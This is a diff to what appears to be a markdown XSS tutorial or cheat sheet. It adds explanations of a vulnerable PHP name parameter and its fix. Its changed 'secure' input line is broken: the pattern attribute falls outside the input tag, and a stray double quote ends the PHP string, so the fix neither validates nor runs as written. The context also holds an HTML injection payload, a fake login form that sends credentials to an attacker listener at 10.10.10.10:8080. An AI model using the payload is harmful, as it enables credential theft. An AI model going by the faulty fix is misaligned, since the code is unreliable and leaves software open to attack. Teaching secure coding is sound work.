@@ -80,6 +80,7 @@ HTML Payloads
 ```
 Unsecure PHP XSS Code Example
 
+The below code snippet is vulnerable to XSS becuase the "name" paramater receives user-supplied input that is not being validated before it gets passed to HTML for output
 ```
 
 <?php
@@ -104,6 +105,11 @@ if (!isset($_GET['name']))
 
 Secure PHP XSS Code Example
 
+Below we added the htmlspecialchars() function infront of the "name" paramater to convert special characters such as <>'"& to HTML entities
+
+This allows HTML to output the user-supplied input as text instead of executing any script tags such as <script>--Malicious_String</script>
+
+We also enforce the HTML Pattern attribute to add regular expression validation by disallowing specific characters such as <>|&'"
 ```
 <?php
 
@@ -112,7 +118,7 @@ if (!isset($_GET['name']))  // Accept user input
 
   echo "<h1>Hi. What is your name?</h1>";
   echo "<form action='' method='GET'>";   // Create text box to accept user input from a GET request
-  echo "<input type='text' name='name'>";
+  echo "<input type='text' name='name'> pattern=[^<>|&'"\x22]+";     //HTML validation - Disallowing the following characters: <>|&'"
   echo "</form>";
 
 
@@ -126,6 +132,8 @@ if (!isset($_GET['name']))  // Accept user input
 ```
 
 Basic PHP XSS HTML Injection Example
+
+Below code snippet can be used to perform a HTML injection attack to redirect the user to a custom login page. When the user submits his/her credentials , a request will be sent to the attacker's listener to capture the credentials in cear-text
 
 ```
 h3>Please login to proceed</h3> <form action=http://10.10.10.10:8080>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
